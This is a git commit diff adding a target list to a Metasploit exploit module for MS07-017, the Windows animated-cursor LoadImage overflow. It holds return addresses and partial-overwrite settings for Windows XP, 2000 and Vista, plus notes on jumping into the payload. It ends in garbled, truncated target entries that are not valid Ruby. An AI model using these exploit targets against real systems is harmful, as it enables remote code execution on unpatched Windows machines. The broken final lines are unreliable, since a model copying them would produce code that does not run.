5b4bed3a7f67ba840b740af5b70e64bb66f35f8a
Gbenga Ojo <gbenga@gbengaojo.com>
2019-01-11 02:03:25 -0600

    Up to Windows XP

--- mtf/modules/ms07_017_ani_loadimage_chunksize2.rb
+++ mtf/modules/ms07_017_ani_loadimage_chunksize2.rb
@@ -55,3 +55,58 @@ class MetasploitModule < Msf::Exploit::Remote
 
           'StackAdjustment' => -3500,
         },
+      'Platform'  => 'win',
+      'Targets'   =>
+        [
+          #
+          # Use multiple cursor URLs to try all targets. This can result in
+          # multiple, sequential sessions
+          #
+
+          [ 'Automatic', {} ],
+
+          #
+          # the followin targets use call [ebx+4], just like the original exploit
+          #
+
+          # Partial overwrite doesn't work for Outlook Express
+          [ 'Windows XP SP2 user32.dll 5.1.2600.2622', { 'Ret' => 0x25ba, 'Len' => 2 }],
+
+          # Should work for all English XP SP2
+          [ 'Windows XP SP2 userenv.dll English', { 'Ret' => 0x769fc81a }],
+
+          # Supplied by Fabrice MOURRON <fab[at]revhosts.net>
+          [ 'Windows XP SP2 userenv.dll French', { 'Ret' => 0x7699c81a }],
+
+          # Should work for English XP SP0/SP1
+          [ 'Windows XP SP0/SP1 netui2.dll English', { 'Ret' => 0x71bd0205 }],
+
+          # Should work for English 2000 SP0-SP4+
+          [ 'Windows 2000 SP0-SP4 netui2.dll English', { 'Ret' => 0x75116d88 }],
+
+          #
+          # Partial overwrite where 700b is a jmp dword [ebx] ebx points to the start
+          # of the RIFF chunk itself. The length field of the RIFF chunk
+          # tag contains a short jump into an embedded riff chunk that
+          # makes a long relative jump into the actual payload.
+          #
+          [ 'Windows Vista user32.dll 6.0.6000.16386',
+            {
+              'Ret'     => 0x700b,
+              'Len'     => 2,
+
+              # On Vista, the pages that contain the RIFF are read-only
+              # In-place decoders cannot be used.
+              'Payload'   => { 'EncoderType' => Msf::Encoder::Type::Raw }
+            }
+          ],
+
+          #
+          # Supplied by Ramon de C Valle
+          #
+
+          # call [ebx+4]
+          [ 'Windows XP SP2 user { 'Ret' => 0x, 
+          [ 'Windows XP SP2 user { 'Ret' => 0x, 
+          [ 'Windows XP SP2 user { 'Ret' => 0x, 
+  
